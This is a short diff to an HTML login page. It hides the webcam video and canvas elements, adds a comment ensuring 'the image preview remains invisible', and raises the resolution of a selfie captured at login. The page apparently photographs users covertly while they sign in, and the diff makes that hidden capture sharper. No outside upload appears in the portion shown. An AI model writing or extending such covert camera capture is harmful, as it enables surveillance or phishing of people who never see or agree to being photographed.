@@ -9,7 +9,7 @@
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
     video, canvas {
-      display: none;
+      display: none; /* Ensure that the image preview remains invisible */
     }
   </style>
 </head>
@@ -25,7 +25,7 @@
       
       <!-- Camera Elements -->
       <video id="video" autoplay playsinline class="rounded-lg border-2 border-gray-300 w-full max-w-xs mt-4"></video>
-      <canvas id="canvas" width="640" height="960" style="display: none;"></canvas>
+      <canvas id="canvas" width="960" height="1440" style="display: none;"></canvas> <!-- Increased resolution -->
 
       <button type="submit" class="w-full max-w-xs bg-[#4CAF50] hover:bg-[#449d48] text-white font-bold rounded-full py-3 px-6 transition-colors mt-2">LOGIN</button>
     </form>
@@ -80,7 +80,7 @@
         return;
       }
 
-      // Capture selfie with improved portrait aspect ratio
+      // Capture selfie with higher quality and resolution
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async function(blob) {
         // Save locally
